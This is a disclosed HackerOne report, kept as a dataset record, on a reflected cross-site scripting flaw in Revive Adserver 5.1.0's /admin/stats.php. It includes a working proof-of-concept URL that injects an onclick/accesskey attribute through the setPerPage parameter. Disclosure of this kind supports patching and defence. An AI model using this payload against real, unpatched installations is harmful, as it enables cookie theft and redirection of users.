---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1083376'
original_report_id: '1083376'
title: Reflected XSS on /admin/stats.php
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: revive_adserver
created_at: '2021-01-21T17:33:21.832Z'
disclosed_at: '2021-01-26T14:27:08.895Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 24
asset_identifier: https://github.com/revive-adserver/revive-adserver
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on /admin/stats.php

## Metadata

- HackerOne Report ID: 1083376
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: revive_adserver
- Disclosed At: 2021-01-26T14:27:08.895Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found a reflected XSS attack on `/admin/stats.php`.

Revive-Adserver version is `revive-adserver-5.1.0`.

- Go to `http://revive-adserver.loc/admin/stats.php?statsBreakdown=day&listorder=key&orderdirection=up&day=&setPerPage=15%27%20onclick=alert(document.domain)%20accesskey=X%20&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020`

- For the payload to be executed, the user needs to press the access key combination for the hidden input field (for Firefox, `Alt`+`Shift`+`X`, see [this](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey) for other browsers).

{F1166756}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
